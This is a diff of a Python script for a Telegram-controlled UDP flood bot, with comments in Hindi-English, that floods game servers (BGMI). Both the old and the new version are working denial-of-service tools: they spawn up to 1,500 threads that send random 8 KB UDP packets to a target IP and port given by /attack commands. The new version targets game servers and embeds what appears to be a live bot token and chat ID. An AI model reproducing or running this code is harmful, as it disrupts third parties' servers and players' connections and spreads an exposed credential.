@@ -1,187 +1,217 @@
 import os
-import sys
-import json
-import time
-import random
 import socket
 import threading
+import time
 import requests
-from pathlib import Path
+import random
 
 # ------------------------------------------------------------------
-# Configuration â€“ read from environment or .env
+# CONFIGURATION
 # ------------------------------------------------------------------
-try:
-    from dotenv import load_dotenv
-    load_dotenv()          # read .env file if present
-except ImportError:
-    # dotenv not installed â€“ continue; values must be in env
-    pass
+BOT_TOKEN = "8629855258:AAG8rGtNF_BTkVBM9cHZuvaA308jykiI6aI"   # Apna Token
+CHAT_ID    = "2138312113"              # Apna Chat ID
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-CHAT_ID   = os.getenv("CHAT_ID")
+# Default Settings (Agar Telegram se na mile toh ye use honge)
+DEFAULT_TARGET_PORT = 15876           
+PACKET_SIZE = 8192                    
+NUM_THREADS = 1500                      
 
-if not BOT_TOKEN or not CHAT_ID:
-    print("[!] BOT_TOKEN and CHAT_ID must be set in env or .env")
-    sys.exit(1)
+# Global Variables
+stop_event = threading.Event()
+active_threads = []
+attack_active = False
+target_ip_global = ""
+current_port = DEFAULT_TARGET_PORT    # Port track karne ke liye
 
 # ------------------------------------------------------------------
-# Telegram helper â€“ send a message
+# Telegram Functions
 # ------------------------------------------------------------------
-def send_telegram_message(text: str):
+def send_msg(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": text,
+        "parse_mode": "HTML",
+        "disable_web_page_preview": True
+    }
     try:
-        r = requests.post(url, json=payload, timeout=5)
-        r.raise_for_status()
-        return True
-    except Exception as exc:
-        print(f"[!] Telegram error: {exc}")
+        r = requests.post(url, json=payload, timeout=10)
+        return r.status_code == 200
+    except Exception as e:
+        print(f"[!] Send Error: {e}")
         return False
 
-# ------------------------------------------------------------------
-# UDP worker â€“ sends packets as fast as possible
-# ------------------------------------------------------------------
-def udp_worker(target_ip: str, target_port: int, packet_size: int, stop_event: threading.Event):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while not stop_event.is_set():
-        # Random payload: keeps packet_size bytes but changes content each time
-        payload = os.urandom(packet_size)
-        try:
-            sock.sendto(payload, (target_ip, target_port))
-        except Exception as exc:
-            # In case of a transient error, just continue
-            print(f"[!] Worker error: {exc}")
-            continue
-    sock.close()
-
-# ------------------------------------------------------------------
-# Flood controller â€“ starts/stops workers
-# ------------------------------------------------------------------
-class FloodController:
-    def __init__(self):
-        self.stop_event = threading.Event()
-        self.threads   = []
-
-    def start(self, ip: str, port: int, threads: int, duration: int, packet_size: int = 1024):
-        if self.threads:
-            send_telegram_message("<b>â— Flood already running. Stop it first.</b>")
-            return
-
-        self.stop_event.clear()
-        self.threads = []
-
-        for _ in range(threads):
-            t = threading.Thread(
-                target=udp_worker,
-                args=(ip, port, packet_size, self.stop_event),
-                daemon=True,
-            )
-            t.start()
-            self.threads.append(t)
-
-        send_telegram_message(
-            f"<b>ðŸš€ UDP Flood started!</b>\n"
-            f"Target: <code>{ip}:{port}</code>\n"
-            f"Threads: <code>{threads}</code>\n"
-            f"Packet size: <code>{packet_size}</code> bytes\n"
-            f"Duration: <code>{duration}</code> seconds"
-        )
-
-        # Automatically stop after duration
-        threading.Timer(duration, self.stop).start()
-
-    def stop(self):
-        if not self.threads:
-            send_telegram_message("<b>âš ï¸ No flood in progress.</b>")
-            return
-
-        self.stop_event.set()
-        for t in self.threads:
-            t.join(timeout=1)
-
-        self.threads = []
-        send_telegram_message("<b>âœ… Flood stopped.</b>")
-
-# ------------------------------------------------------------------
-# Telegram command parser
-# ------------------------------------------------------------------
-def parse_command(message: str):
-    """
-    Expected format:
-    /start_flood <IP> <PORT> <THREADS> <DURATION>
-    /stop_flood
-    """
-    parts = message.strip().split()
-    if not parts:
-        return None
-
-    cmd = parts[0].lower()
-    if cmd == "/start_flood" and len(parts) == 5:
-        try:
-            ip = parts[1]
-            port = int(parts[2])
-            threads = int(parts[3])
-            duration = int(parts[4])
-            return ("start", ip, port, threads, duration)
-        except ValueError:
-            return ("error", "Invalid numeric values.")
-    elif cmd == "/stop_flood":
-        return ("stop",)
-    else:
-        return ("error", "Unrecognized command.")
-
-# ------------------------------------------------------------------
-# Polling loop â€“ checks for new messages
-# ------------------------------------------------------------------
-def poll_telegram_updates():
-    """
-    Simple longâ€‘polling implementation. Keeps track of last update_id.
-    """
+def get_latest_update():
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-    last_update_id = None
+    try:
+        r = requests.get(url, timeout=10)
+        data = r.json()
+        if data['ok']:
+            updates = data['result']
+            if updates:
+                return updates[-1]
+    except Exception as e:
+        print(f"[!] Get Update Error: {e}")
+    return None
 
-    controller = FloodController()
+# ------------------------------------------------------------------
+# UDP Flood Worker
+# ------------------------------------------------------------------
+def udp_worker(target_ip, target_port):
+    try:
+        # UDP Socket Create karein
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        
+        # Connection less nature ke liye options
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        
+        while not stop_event.is_set():
+            # Random data payload bhejein
+            payload = os.urandom(PACKET_SIZE)
+            
+            try:
+                # UDP packet bhejna
+                sock.sendto(payload, (target_ip, target_port))
+            except Exception:
+                break
+        
+        sock.close()
+    except Exception:
+        pass
+
+# ------------------------------------------------------------------
+# Main Attack Logic
+# ------------------------------------------------------------------
+def start_attack(ip, duration=60, port=None):
+    global stop_event, active_threads, attack_active, target_ip_global, current_port
+
+    # Agar port nahi diya gaya, toh current ya default use karein
+    target_port = port if port else current_port
+    
+    # Purana attack band karein agar chal raha hai
+    if attack_active:
+        print("[*] Stopping previous attack...")
+        stop_event.set()
+        time.sleep(1)
+        stop_event.clear()
+    
+    target_ip_global = ip
+    current_port = target_port  # Update global port
+    
+    print(f"[*] Starting INSTANT UDP Flood on {ip}:{target_port} for {duration}s...")
+    attack_active = True
+
+    # Threads start karein
+    print(f"[*] Spawning {NUM_THREADS} UDP threads...")
+    
+    for i in range(NUM_THREADS):
+        t = threading.Thread(target=udp_worker, args=(ip, target_port), daemon=True)
+        active_threads.append(t)
+        t.start()
+
+    send_msg(
+        f"<b>🚀 BGMI UDP FLOOD ATTACK!</b>\n"
+        f"Target: <code>{ip}:{target_port}</code>\n"  # Dynamic port dikhayein
+        f"Method: UDP Flood\n"
+        f"Duration: <code>{duration}s</code>\n"
+        f"Threads: <code>{NUM_THREADS}</code>"
+    )
+
+    # Auto Stop Function
+    def auto_stop():
+        time.sleep(duration)
+        if attack_active:
+            stop_attack()
+
+    threading.Thread(target=auto_stop, daemon=True).start()
+
+def stop_attack():
+    global stop_event, active_threads, attack_active
+
+    if not stop_event.is_set():
+        print("[*] Stopping attack...")
+        stop_event.set()
+
+        # Saare threads ko close hone ka signal dein
+        for t in active_threads:
+            t.join(timeout=2)
+
+        active_threads = []
+        attack_active = False
+        send_msg("<b>✅ Attack Stopped!</b>")
+    else:
+        send_msg("⚠️ No active attack to stop.")
+
+def main_loop():
+    print(f"[*] BGMI UDP Ping High Bot is Running...")
+
+    send_msg(
+        f"<b>🎮 BGMI UDP Flood Bot</b>\n\n"
+        f"Commands:\n"
+        f"<code>/attack IP PORT DURATION</code>\n"
+        f"<code>/stop</code>\n"
+        f"<code>/status</code>"
+    )
 
     while True:
-        params = {"timeout": 60}
-        if last_update_id:
-            params["offset"] = last_update_id + 1
         try:
-            resp = requests.get(url, params=params, timeout=70)
-            resp.raise_for_status()
-            data = resp.json()
-            if not data.get("ok"):
-                print("[!] Telegram API error:", data)
-                continue
+            update = get_latest_update()
 
-            for update in data.get("result", []):
-                last_update_id = update["update_id"]
-                message = update.get("message")
-                if not message:
-                    continue
-                text = message.get("text", "")
-                if not text:
+            if update:
+                message = update.get('message', {})
+                text = message.get('text', '').strip()
+
+                chat_id_msg = message.get('chat', {}).get('id')
+                if str(chat_id_msg) != str(CHAT_ID):
                     continue
 
-                parsed = parse_command(text)
-                if not parsed:
-                    continue
+                print(f"[+] Command: {text}")
 
-                if parsed[0] == "start":
-                    _, ip, port, threads, duration = parsed
-                    controller.start(ip, port, threads, duration)
-                elif parsed[0] == "stop":
-                    controller.stop()
-                elif parsed[0] == "error":
-                    send_telegram_message(f"<b>âŒ Error:</b> {parsed[1]}")
-        except Exception as exc:
-            print("[!] Polling error:", exc)
-            time.sleep(5)  # brief backâ€‘off
+                if text == "/start":
+                    send_msg(
+                        f"<b>🎮 BGMI UDP Flood Bot</b>\n\n"
+                        f"Commands:\n"
+                        f"<code>/attack IP PORT DURATION</code>\n"
+                        f"<code>/stop</code>\n"
+                        f"<code>/status</code>"
+                    )
 
-# ------------------------------------------------------------------
-# Entry point
-# ------------------------------------------------------------------
+                elif text.startswith("/attack"):
+                    parts = text.split()
+                    # Format: /attack 20.235.145.120 15876 60
+                    if len(parts) >= 2:
+                        ip = parts[1]
+                        
+                        # Port optional hai, agar nahi diya toh default use hoga
+                        port = int(parts[2]) if len(parts) > 2 else None
+                        
+                        # Duration optional hai, default 60 seconds
+                        duration = int(parts[3]) if len(parts) > 3 else 60
+                        
+                        try:
+                            start_attack(ip, duration, port)
+                        except ValueError:
+                            send_msg("❌ Invalid IP/Port/Duration format.")
+                    else:
+                        send_msg("❌ Usage: /attack [IP] [PORT] [DURATION]")
+
+                elif text == "/stop":
+                    stop_attack()
+
+                elif text == "/status":
+                    status = "Active" if attack_active else "Idle"
+                    count = len(active_threads)
+                    send_msg(f"✅ Status: {status}\nThreads Running: {count}\nTarget Port: {current_port}")
+
+            time.sleep(2)
+
+        except KeyboardInterrupt:
+            print("\n[!] Stopping Bot...")
+            stop_attack()
+            break
+        except Exception as e:
+            print(f"[!] Error: {e}")
+            time.sleep(2)
+
 if __name__ == "__main__":
-    print("[*] UDP Flood Telegram Bot is running. Awaiting commands...")
-    poll_telegram_updates()
+    main_loop()
